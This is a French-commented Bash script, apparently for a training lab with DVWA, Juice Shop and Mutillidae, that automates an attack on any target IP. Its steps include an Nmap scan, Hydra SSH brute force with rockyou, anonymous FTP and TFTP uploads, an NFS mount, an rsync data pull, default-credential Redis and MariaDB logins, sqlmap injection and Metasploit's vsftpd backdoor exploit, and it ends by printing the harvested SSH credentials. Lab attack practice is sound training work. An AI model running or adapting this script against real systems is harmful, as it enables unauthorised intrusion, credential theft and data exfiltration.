#!/bin/bash

set -o pipefail

# ==============================================================================
# Script de Simulation d'Attaque Complète (Attaquant Kali)
# ==============================================================================

# --- Configuration des couleurs ---
export RED='\033[0;31m'
export GREEN='\033[0;32m'
export YELLOW='\033[1;33m'
export BLUE='\033[0;34m'
export CYAN='\033[0;36m'
export NC='\033[0m'

# --- Fonctions pour l'affichage ---
print_header() {
    echo -e "\n${CYAN}========================================${NC}"
    echo -e "${CYAN} $1 ${NC}"
    echo -e "${CYAN}========================================${NC}"
}

print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[ACTION]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

require_argument() {
    if [ -z "$1" ]; then
        print_error "Veuillez fournir l'adresse IP ou le nom d'hôte de la cible."
        echo -e "${YELLOW}Usage: $0 <IP_ADDRESS>${NC}"
        exit 1
    fi
}

require_command() {
    local cmd="$1"
    local pkg="$2"
    if command -v "$cmd" >/dev/null 2>&1; then
        return 0
    fi
    if [ -n "$pkg" ]; then
        print_warning "La commande '$cmd' est introuvable. Installez le paquet '$pkg'. Étape ignorée."
    else
        print_warning "La commande '$cmd' est introuvable. Étape ignorée."
    fi
    return 1
}

record_result() {
    local status="$1"
    local message="$2"
    SUMMARY+=("[$status] $message")
}

run_and_capture() {
    local outfile="$1"
    shift
    local cmd=("$@")
    print_warning "Commande: ${cmd[*]}"
    if "${cmd[@]}" 2>&1 | tee "$outfile"; then
        print_success "Exécution réussie. Résultats sauvegardés dans $outfile"
        return 0
    else
        print_error "La commande a échoué (voir $outfile)."
        return 1
    fi
}

run_and_capture_quiet() {
    local outfile="$1"
    shift
    local cmd=("$@")
    print_warning "Commande: ${cmd[*]}"
    if "${cmd[@]}" >"$outfile" 2>&1; then
        print_success "Exécution réussie. Résultats sauvegardés dans $outfile"
        return 0
    else
        print_error "La commande a échoué (voir $outfile)."
        return 1
    fi
}

SUMMARY=()

# --- Préparation ---
require_argument "$1"
TARGET_IP="$1"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
RESULTS_ROOT=${RESULTS_DIR:-attack_results}
RUN_DIR="$RESULTS_ROOT/${TARGET_IP//\//_}_$TIMESTAMP"
mkdir -p "$RUN_DIR"

print_header "LANCEMENT DE LA SIMULATION D'ATTAQUE CONTRE $TARGET_IP"
print_info "Les résultats seront sauvegardés dans '$RUN_DIR'"

# --------------------------------------------------------------
# Étape 1 : Reconnaissance Nmap
# --------------------------------------------------------------
step_recon() {
    print_header "ÉTAPE 1 : RECONNAISSANCE (Nmap)"
    require_command nmap nmap || { record_result "SKIP" "Scan Nmap (binaire manquant)"; return; }
    local outfile="$RUN_DIR/nmap_full_scan.txt"
    if run_and_capture "$outfile" nmap -sS -sV -p- -T4 "$TARGET_IP"; then
        record_result "OK" "Scan Nmap complet"
    else
        record_result "ERR" "Scan Nmap"
    fi
}

# --------------------------------------------------------------
# Étape 2 : Brute-force SSH
# --------------------------------------------------------------
step_ssh_bruteforce() {
    print_header "ÉTAPE 2 : BRUTE-FORCE SSH"
    require_command hydra hydra || { record_result "SKIP" "Hydra (binaire manquant)"; return; }
    local wordlist="/usr/share/wordlists/rockyou.txt"
    if [ ! -f "$wordlist" ]; then
        print_warning "Wordlist rockyou.txt introuvable ($wordlist). Étape ignorée."
        record_result "SKIP" "Brute-force SSH (wordlist manquante)"
        return
    fi
    local outfile="$RUN_DIR/hydra_ssh_output.txt"
    print_info "Tentative de brute-force sur SSH avec l'utilisateur 'admin'."
    print_warning "Commande: hydra -l admin -P $wordlist ssh://$TARGET_IP"
    if hydra -l admin -P "$wordlist" "ssh://$TARGET_IP" -o "$outfile"; then
        print_success "Hydra a terminé. Résultats sauvegardés dans $outfile"
        if grep -q "\[ssh\].*login: admin" "$outfile"; then
            ssh_password=$(awk '/\[ssh\].*login: admin/{print $NF}' "$outfile" | tail -n1)
            print_success "Identifiants SSH trouvés: admin:$ssh_password"
            SSH_CREDS_FOUND="admin:$ssh_password"
            record_result "OK" "Brute-force SSH (admin:$ssh_password)"
        else
            print_warning "Aucun mot de passe trouvé pour 'admin'."
            record_result "WARN" "Brute-force SSH (aucun succès)"
        fi
    else
        print_error "Hydra a échoué (voir $outfile)."
        record_result "ERR" "Brute-force SSH"
    fi
}

# --------------------------------------------------------------
# Étape 3 : FTP anonyme & upload
# --------------------------------------------------------------
step_ftp_anonymous() {
    print_header "ÉTAPE 3 : FTP ANONYME"
    require_command curl curl || { record_result "SKIP" "FTP anonyme (curl manquant)"; return; }
    local list_file="$RUN_DIR/ftp_listing.txt"
    print_info "Test d'un accès FTP anonyme en lecture."
    if curl -s --user anonymous:anonymous "ftp://$TARGET_IP/" >"$list_file" 2>&1; then
        print_success "Listing FTP récupéré (voir $list_file)."
        record_result "OK" "FTP anonyme (listing)"
    else
        print_warning "Impossible de lister le FTP en anonyme (voir $list_file)."
        record_result "WARN" "FTP anonyme (pas de listing)"
    fi

    local upload_file="$RUN_DIR/ftp_upload_test.txt"
    echo "Uploaded by attack simulator" >"$upload_file"
    print_info "Tentative d'upload anonyme sur FTP."
    if curl -s --ftp-create-dirs --user anonymous:anonymous -T "$upload_file" "ftp://$TARGET_IP/upload/ftp_upload_test.txt" >>"$list_file" 2>&1; then
        print_success "Upload FTP anonyme réussi (fichier ftp_upload_test.txt)."
        record_result "OK" "FTP anonyme (upload réussi)"
    else
        print_warning "Upload FTP anonyme impossible (voir $list_file)."
        record_result "WARN" "FTP anonyme (upload échoué)"
    fi
}

# --------------------------------------------------------------
# Étape 4 : Samba (SMB) partages publics
# --------------------------------------------------------------
step_samba_enum() {
    print_header "ÉTAPE 4 : ENUM SMB"
    require_command smbclient smbclient || { record_result "SKIP" "SMB (smbclient manquant)"; return; }
    local outfile="$RUN_DIR/smb_shares.txt"
    if run_and_capture "$outfile" smbclient -L "//$TARGET_IP/" -N; then
        record_result "OK" "Enumération SMB"
    else
        record_result "WARN" "Enumération SMB"
    fi

    local mount_out="$RUN_DIR/smb_public_listing.txt"
    if run_and_capture_quiet "$mount_out" smbclient "//$TARGET_IP/public" -N -c "ls"; then
        record_result "OK" "Accès SMB public"
    else
        record_result "WARN" "Accès SMB public"
    fi
}

# --------------------------------------------------------------
# Étape 5 : Telnet root
# --------------------------------------------------------------
step_telnet_root() {
    print_header "ÉTAPE 5 : TEST TELNET"
    require_command telnet telnet || { record_result "SKIP" "Telnet (binaire manquant)"; return; }
    local outfile="$RUN_DIR/telnet_banner.txt"
    print_info "Tentative de connexion Telnet pour récupérer la bannière."
    if timeout 5 bash -c "printf 'exit\n' | telnet $TARGET_IP 23" >"$outfile" 2>&1; then
        print_success "Bannière Telnet récupérée (voir $outfile)."
        record_result "OK" "Telnet (bannière)"
    else
        print_warning "Échec ou port fermé (voir $outfile)."
        record_result "WARN" "Telnet"
    fi
}

# --------------------------------------------------------------
# Étape 6 : TFTP upload
# --------------------------------------------------------------
step_tftp() {
    print_header "ÉTAPE 6 : TEST TFTP"
    require_command atftp atftp || { record_result "SKIP" "TFTP (atftp manquant)"; return; }
    local outfile="$RUN_DIR/tftp_result.txt"
    local tmpfile="$RUN_DIR/tftp_test.txt"
    echo "Test TFTP" >"$tmpfile"
    print_info "Tentative d'upload de fichier via TFTP sans authentification."
    if atftp --trace "$TARGET_IP" -p -l "$tmpfile" -r "tftp_test.txt" >"$outfile" 2>&1; then
        print_success "Upload TFTP sans authentification réussi."
        record_result "OK" "TFTP (upload)"
    else
        print_warning "Upload TFTP échoué ou service indisponible (voir $outfile)."
        record_result "WARN" "TFTP"
    fi
}

# --------------------------------------------------------------
# Étape 7 : SNMP public
# --------------------------------------------------------------
step_snmp() {
    print_header "ÉTAPE 7 : ENUM SNMP"
    require_command snmpwalk snmp || { record_result "SKIP" "SNMP (snmpwalk manquant)"; return; }
    local outfile="$RUN_DIR/snmp_public.txt"
    if run_and_capture_quiet "$outfile" snmpwalk -v2c -c public -t 2 -r 1 "$TARGET_IP" 1.3.6.1.2.1.1; then
        record_result "OK" "SNMP communauté public"
    else
        record_result "WARN" "SNMP"
    fi
}

# --------------------------------------------------------------
# Étape 8 : NFS export
# --------------------------------------------------------------
step_nfs() {
    print_header "ÉTAPE 8 : ENUM NFS"
    require_command showmount nfs-common || { record_result "SKIP" "NFS (showmount absent)"; return; }
    local outfile="$RUN_DIR/nfs_exports.txt"
    if run_and_capture "$outfile" showmount -e "$TARGET_IP"; then
        record_result "OK" "NFS export"
        if grep -q "/srv/nfs/public" "$outfile"; then
            local mount_dir="$RUN_DIR/nfs_mount"
            mkdir -p "$mount_dir"
            print_info "Tentative de montage de l'export NFS /srv/nfs/public."
            if sudo mount -t nfs -o rw,nolock "$TARGET_IP:/srv/nfs/public" "$mount_dir" 2>>"$outfile"; then
                ls "$mount_dir" >"$RUN_DIR/nfs_listing.txt"
                print_success "Montage NFS réussi (voir nfs_listing.txt)."
                record_result "OK" "NFS montage"
                sudo umount "$mount_dir"
            else
                print_warning "Échec du montage NFS (détails dans nfs_exports.txt)."
                record_result "WARN" "NFS montage"
            fi
        fi
    else
        record_result "WARN" "NFS export"
    fi
}

# --------------------------------------------------------------
# Étape 9 : Rsync anonyme
# --------------------------------------------------------------
step_rsync() {
    print_header "ÉTAPE 9 : ENUM RSYNC"
    require_command rsync rsync || { record_result "SKIP" "Rsync (binaire manquant)"; return; }
    local outfile="$RUN_DIR/rsync_modules.txt"
    if run_and_capture "$outfile" rsync rsync://"$TARGET_IP"/; then
        record_result "OK" "Rsync modules listés"
        if grep -q "public" "$outfile"; then
            local rsync_dir="$RUN_DIR/rsync_public"
            mkdir -p "$rsync_dir"
            print_info "Tentative de synchronisation du module 'public'."
            if rsync -av rsync://"$TARGET_IP"/public/ "$rsync_dir" >>"$outfile" 2>&1; then
                print_success "Synchronisation Rsync réussie (données dans $rsync_dir)."
                record_result "OK" "Rsync (module public téléchargé)"
            else
                print_warning "Échec de la synchronisation Rsync (voir $outfile)."
                record_result "WARN" "Rsync (sync)"
            fi
        fi
    else
        record_result "WARN" "Rsync modules"
    fi
}

# --------------------------------------------------------------
# Étape 10 : Redis exposé
# --------------------------------------------------------------
step_redis() {
    print_header "ÉTAPE 10 : ENUM REDIS"
    require_command redis-cli redis-tools || { record_result "SKIP" "Redis (redis-cli manquant)"; return; }
    local outfile="$RUN_DIR/redis_info.txt"
    print_info "Tentative de connexion Redis sans mot de passe."
    if redis-cli -h "$TARGET_IP" -p 6379 INFO >"$outfile" 2>&1; then
        print_success "Connexion Redis réussie (voir redis_info.txt)."
        record_result "OK" "Redis (accès sans mot de passe)"
    else
        print_warning "Connexion Redis échouée (voir redis_info.txt)."
        record_result "WARN" "Redis"
    fi
}

# --------------------------------------------------------------
# Étape 11 : MariaDB exposée
# --------------------------------------------------------------
step_mariadb() {
    print_header "ÉTAPE 11 : TEST MARIADB"
    require_command mysql mariadb-client || { record_result "SKIP" "MariaDB (client mysql manquant)"; return; }
    local outfile="$RUN_DIR/mariadb_test.txt"
    print_info "Tentatives d'authentification MariaDB à distance."
    if mysql -h "$TARGET_IP" -u root --password='' -e "SHOW DATABASES;" >"$outfile" 2>&1; then
        print_success "Connexion MariaDB root sans mot de passe réussie."
        record_result "OK" "MariaDB root sans mot de passe"
    else
        print_warning "Connexion root sans mot de passe échouée."
        record_result "WARN" "MariaDB root sans mot de passe"
    fi
    if mysql -h "$TARGET_IP" -u test -ptest -e "SHOW DATABASES;" >>"$outfile" 2>&1; then
        print_success "Connexion MariaDB test/test réussie."
        record_result "OK" "MariaDB test/test"
    else
        print_warning "Connexion test/test échouée (voir mariadb_test.txt)."
        record_result "WARN" "MariaDB test/test"
    fi
}

# --------------------------------------------------------------
# Étape 12 : Fuzzing Web
# --------------------------------------------------------------
step_web_fuzz() {
    print_header "ÉTAPE 12 : FUZZING WEB"
    require_command gobuster gobuster || { record_result "SKIP" "Gobuster manquant"; return; }
    local wordlist="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    if [ ! -f "$wordlist" ]; then
        print_warning "Wordlist dirbuster introuvable ($wordlist). Étape ignorée."
        record_result "SKIP" "Gobuster (wordlist manquante)"
        return
    fi
    local outfile="$RUN_DIR/gobuster_output.txt"
    if gobuster dir -u "http://$TARGET_IP" -w "$wordlist" -x php,html,txt -o "$outfile"; then
        print_success "Gobuster terminé (voir gobuster_output.txt)."
        record_result "OK" "Gobuster"
    else
        print_warning "Gobuster a rencontré une erreur (voir gobuster_output.txt)."
        record_result "WARN" "Gobuster"
    fi
}

# --------------------------------------------------------------
# Étape 13 : Injection SQL DVWA
# --------------------------------------------------------------
step_sqlmap() {
    print_header "ÉTAPE 13 : SQLMAP DVWA"
    require_command sqlmap sqlmap || { record_result "SKIP" "sqlmap manquant"; return; }
    local outfile="$RUN_DIR/sqlmap_dvwa.txt"
    local dvwa_url="http://$TARGET_IP/dvwa/login.php"
    if curl -s --head "$dvwa_url" | grep -q "200"; then
        print_info "DVWA détecté, exécution de sqlmap." 
        if sqlmap -u "$dvwa_url" --data="username=admin&password=admin&Login=Login" --cookie="PHPSESSID=dummy" --dbs --batch --output-dir="$RUN_DIR/sqlmap" --risk=3 --level=5 >>"$outfile" 2>&1; then
            print_success "sqlmap a terminé (voir sqlmap_dvwa.txt)."
            record_result "OK" "sqlmap DVWA"
        else
            print_warning "sqlmap a échoué (voir sqlmap_dvwa.txt)."
            record_result "WARN" "sqlmap DVWA"
        fi
    else
        print_warning "DVWA non accessible à $dvwa_url, étape ignorée."
        record_result "SKIP" "sqlmap DVWA (non détecté)"
    fi
}

# --------------------------------------------------------------
# Étape 14 : Exploitation vsftpd avec Metasploit
# --------------------------------------------------------------
step_metasploit() {
    print_header "ÉTAPE 14 : METASPLOIT VSFTPD"
    require_command msfconsole metasploit-framework || { record_result "SKIP" "Metasploit manquant"; return; }
    local outfile="$RUN_DIR/msf_vsftpd.txt"
    local msf_script=$(mktemp)
    cat <<EOF >"$msf_script"
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS $TARGET_IP
check
exploit
exit
EOF
    print_info "Lancement de msfconsole en mode scripté."
    if msfconsole -q -r "$msf_script" >"$outfile" 2>&1; then
        print_success "Metasploit exécuté (voir msf_vsftpd.txt)."
        record_result "OK" "Metasploit vsftpd"
    else
        print_warning "Metasploit a échoué (voir msf_vsftpd.txt)."
        record_result "WARN" "Metasploit vsftpd"
    fi
    rm -f "$msf_script"
}

# --------------------------------------------------------------
# Étape 15 : Juice Shop & Mutillidae
# --------------------------------------------------------------
step_web_apps_info() {
    print_header "ÉTAPE 15 : APPLICATIONS WEB DOCKER"
    require_command curl curl || { record_result "SKIP" "Vérification applications web (curl manquant)"; return; }
    local juice_file="$RUN_DIR/juice_shop_homepage.html"
    local mutillidae_file="$RUN_DIR/mutillidae_homepage.html"
    if curl -s "http://$TARGET_IP:3000" -o "$juice_file"; then
        print_success "Juice Shop accessible (contenu sauvegardé)."
        record_result "OK" "Juice Shop accessible"
    else
        print_warning "Juice Shop inaccessible."
        record_result "WARN" "Juice Shop"
    fi
    if curl -s "http://$TARGET_IP:8081" -o "$mutillidae_file"; then
        print_success "Mutillidae accessible (contenu sauvegardé)."
        record_result "OK" "Mutillidae accessible"
    else
        print_warning "Mutillidae inaccessible."
        record_result "WARN" "Mutillidae"
    fi
}

# --------------------------------------------------------------
# Exécution séquentielle des étapes
# --------------------------------------------------------------
step_recon
step_ssh_bruteforce
step_ftp_anonymous
step_samba_enum
step_telnet_root
step_tftp
step_snmp
step_nfs
step_rsync
step_redis
step_mariadb
step_web_fuzz
step_sqlmap
step_metasploit
step_web_apps_info

# --------------------------------------------------------------
# Résumé final
# --------------------------------------------------------------
print_header "RAPPORT FINAL DE L'ATTAQUE"
for entry in "${SUMMARY[@]}"; do
    status="${entry%%]*}"
    status="${status#[}"
    message="${entry#*] }"
    if [ "$message" = "$entry" ]; then
        message="$entry"
    fi
    case "$status" in
        OK) print_success "$message" ;;
        WARN) print_warning "$message" ;;
        ERR) print_error "$message" ;;
        SKIP) print_info "(Sauté) $message" ;;
        *) print_info "$entry" ;;
    esac
done

if [ -n "$SSH_CREDS_FOUND" ]; then
    print_success "Identifiants SSH récupérés : $SSH_CREDS_FOUND"
    print_info "Utiliser : ssh ${SSH_CREDS_FOUND%%:*}@$TARGET_IP"
fi

print_info "Tous les artefacts sont dans : $RUN_DIR"
print_info "Analysez manuellement les fichiers pour approfondir les vecteurs."
exit 0